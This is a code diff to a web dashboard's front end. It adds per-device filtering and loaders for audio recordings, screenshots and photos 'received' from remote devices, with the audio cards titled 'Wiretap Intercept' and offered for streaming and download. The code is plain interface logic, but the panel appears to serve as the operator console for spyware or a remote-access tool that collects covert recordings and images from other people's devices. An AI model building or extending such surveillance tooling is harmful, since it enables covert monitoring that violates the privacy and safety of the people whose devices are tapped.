+                const dataKey = files.map(f => typeof f === 'string' ? f : `${f.path}:${f.size}`).join('|');
+                if (dataKey === lastAudioDataKey && !grid.querySelector('.empty-state')) {
+                    // Nothing changed, keep DOM exactly as-is so user playback / scrubber is uninterrupted
+                    return;
+                }
+
+                if (isPlaying) {
+                    // An audio player is actively playing; keep playing card uninterrupted
+                    return;
+                }
+
+                lastAudioDataKey = dataKey;
+                renderAudioGrid(files);
+
+                // If a filter is currently active, re-apply it
+                const filterInput = document.getElementById('audio-filter');
+                if (filterInput && filterInput.value.trim()) {
+                    filterAudioCards(filterInput.value);
+                }
+            } catch (e) { console.error('Audio load failed:', e); }
+        }
+
+        function renderAudioGrid(files) {
+            const grid = document.getElementById('audio-grid');
+            if (!grid) return;
+
+            grid.innerHTML = files.map(f => {
+                const path = typeof f === 'string' ? f : f.path;
+                const filename = typeof f === 'object' && f.filename ? f.filename : path.split('/').pop();
+                const deviceId = typeof f === 'object' && f.device_id ? f.device_id : (path.includes('/') ? path.split('/')[0] : 'Unknown');
+                const sizeStr = typeof f === 'object' && f.size_str ? f.size_str : '';
+                const timeStr = typeof f === 'object' && f.formatted_time ? f.formatted_time : (f.timestamp ? new Date(f.timestamp).toLocaleString() : '');
+                const durEst = typeof f === 'object' && f.duration_est ? f.duration_est : '';
+                const downloadUrl = `/api/audio/file/${encodeURI(path)}?download=1`;
+                const streamUrl = `/api/audio/file/${encodeURI(path)}`;
+
+                return `
+                    <div class="audio-item-card" data-search="${escapeHtml((deviceId + ' ' + filename + ' ' + timeStr).toLowerCase())}">
+                        <div class="audio-card-top">
+                            <div class="audio-card-info">
+                                <div class="audio-icon-wrap">🎙️</div>
+                                <div class="audio-details">
+                                    <div class="audio-title">
+                                        <span>Wiretap Intercept</span>
+                                        <span class="badge-tag">${escapeHtml(deviceId)}</span>
+                                    </div>
+                                    <div class="audio-filename" title="${escapeHtml(path)}">
+                                        ${escapeHtml(filename)}
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="audio-meta-right">
+                                <span class="audio-timestamp">${escapeHtml(timeStr || 'Recorded')}</span>
+                                <div style="display: flex; gap: 4px;">
+                                    ${durEst ? `<span class="audio-stats-pill">⏱️ ${escapeHtml(durEst)}</span>` : ''}
+                                    ${sizeStr ? `<span class="audio-stats-pill">💾 ${escapeHtml(sizeStr)}</span>` : ''}
+                                </div>
+                            </div>
                         </div>
-                        <div class="audio-player">
-                            <audio controls preload="none">
-                                <source src="/api/audio/file/${encodeURIComponent(f)}" type="audio/mp4">
-                                <source src="/api/audio/file/${encodeURIComponent(f)}" type="audio/aac">
-                                <source src="/api/audio/file/${encodeURIComponent(f)}" type="audio/mpeg">
+                        <div class="audio-player-container">
+                            <audio controls preload="metadata" style="width: 100%; height: 38px; outline: none; border-radius: 6px;">
+                                <source src="${streamUrl}" type="audio/mp4">
+                                <source src="${streamUrl}" type="audio/aac">
                                 Your browser does not support audio playback.
                             </audio>
                         </div>
+                        <div class="audio-card-footer">
+                            <span style="font-family: var(--font-mono); font-size: 10px; color: var(--text-muted);">Format: AAC / MPEG-4</span>
+                            <div style="display: flex; gap: 6px;">
+                                <a href="${downloadUrl}" download="${escapeHtml(filename)}" class="badge-btn" style="text-decoration: none;">⬇ Download M4A</a>
+                            </div>
+                        </div>
                     </div>
-                `).join('');
-            } catch (e) { console.error('Audio load failed:', e); }
+                `;
+            }).join('');
+        }
+
+        function filterAudioCards(query) {
+            const q = query.toLowerCase().trim();
+            const cards = document.querySelectorAll('#audio-grid .audio-item-card');
+            cards.forEach(card => {
+                const searchData = card.getAttribute('data-search') || '';
+                card.style.display = searchData.includes(q) ? 'flex' : 'none';
+            });
         }
 
         // Load Screenshots & Photos
         async function loadScreenshots() {
             try {
-                const resp = await fetch('/api/screenshots');
+                const url = selectedDeviceId ? `/api/screenshots?device=${encodeURIComponent(selectedDeviceId)}` : '/api/screenshots';
+                const resp = await fetch(url);
                 const files = await resp.json();
                 document.getElementById('count-screens').textContent = files.length;
                 document.getElementById('stat-screenshots').textContent = files.length;
@@ -1972,7 +2526,7 @@
                     grid.innerHTML = `
                         <div class="empty-state" style="grid-column: 1/-1;">
                             <div class="empty-icon">🖼️</div>
-                            <div>No screenshots or photos received yet</div>
+                            <div>No screenshots received yet</div>
                         </div>
                     `;
                     return;
@@ -1994,6 +2548,43 @@
                     </div>
                 `).join('');
             } catch (e) { console.error('Screenshots load failed:', e); }
+        }
+
+        // Load Photos
+        async function loadPhotos() {
+            try {
+                const url = selectedDeviceId ? `/api/photos?device=${encodeURIComponent(selectedDeviceId)}` : '/api/photos';
+                const resp = await fetch(url);
+                const files = await resp.json();
+                document.getElementById('count-photos').textContent = files.length;
+
+                const grid = document.getElementById('photos-grid');
+                if (files.length === 0) {
+                    grid.innerHTML = `
+                        <div class="empty-state" style="grid-column: 1/-1;">
+                            <div class="empty-icon">📷</div>
+                            <div>No photos received yet</div>
+                        </div>
+                    `;
+                    return;
+                }
+
+                grid.innerHTML = files.map(f => `
+                    <div class="screenshot-card">
+                        <div class="screenshot-thumb-wrap" onclick="openLightbox('/api/photo/file/${encodeURIComponent(f)}')">
+                            <img class="screenshot-thumb" src="/api/photo/file/${encodeURIComponent(f)}" alt="${escapeHtml(f)}" loading="lazy">
+                        </div>
+                        <div class="screenshot-meta">
+                            <span style="font-family: var(--font-mono); font-size: 11px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 150px;">
+                                ${escapeHtml(f)}
+                            </span>
+                            <a href="/api/photo/file/${encodeURIComponent(f)}" download class="badge-btn" style="text-decoration: none;">
+                                ⬇ Save
+                            </a>
+                        </div>
+                    </div>
+                `).join('');
+            } catch (e) { console.error('Photos load failed:', e); }
         }
 
         // Filter Table Helper
@@ -2045,10 +2636,14 @@
             loadStatus();
             loadDevices();
             loadEvents();
-            loadLatestPayload();
+            const select = document.getElementById('payload-select');
+            if (!select || select.value === 'latest') {
+                loadLatestPayload();
+            }
             loadPayloadsList();
             loadAudio();
             loadScreenshots();
+            loadPhotos();
         }
 
         // Initialize
